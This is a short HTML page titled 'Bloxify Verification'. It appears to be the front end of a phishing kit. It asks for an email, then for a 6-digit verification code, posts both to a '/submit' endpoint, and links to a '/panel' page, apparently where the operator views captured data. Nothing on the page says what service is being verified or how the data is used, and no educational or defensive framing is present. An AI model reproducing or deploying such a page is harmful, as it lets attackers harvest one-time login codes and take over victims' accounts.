<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Bloxify</title>
<style>
body {
    margin: 0;
    background: #0b0b0b;
    color: #eee;
    font-family: Arial;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}
#box {
    width: 560px;
    padding: 45px;
    background: #151515;
    border-radius: 18px;
    text-align: center;
}
input, button {
    width: 100%;
    padding: 14px;
    margin-top: 15px;
    border-radius: 10px;
    border: none;
    font-size: 16px;
}
input {
    background: #222;
    color: white;
}
button {
    background: #333;
    color: white;
    cursor: pointer;
}
button:hover { background: #444; }
#error { color: #ff6b6b; display: none; }
#codeBox { display: none; }
</style>
</head>

<body>
<div id="box">
    <h1>Bloxify Verification</h1>

    <input id="email" placeholder="Email">
    <button onclick="sendEmail()">Submit</button>

    <div id="codeBox">
        <input id="code"
            maxlength="6"
            placeholder="6-digit code"
            inputmode="numeric"
            oninput="this.value=this.value.replace(/[^0-9]/g,'')"
        >
        <button onclick="sendCode()">Verify</button>
        <p id="error">Verification failed, try again</p>
    </div>

    <br>
    <a href="/panel" style="color:#777;">Panel</a>
</div>

<script>
function sendEmail() {
    fetch("/submit", {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({ email: email.value })
    });
    document.getElementById("codeBox").style.display = "block";
}

function sendCode() {
    fetch("/submit", {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({
            email: email.value,
            code: code.value
        })
    }).then(r => {
        if (!r.ok) document.getElementById("error").style.display = "block";
        else alert("Verification complete");
    });
}
</script>
</body>
</html>
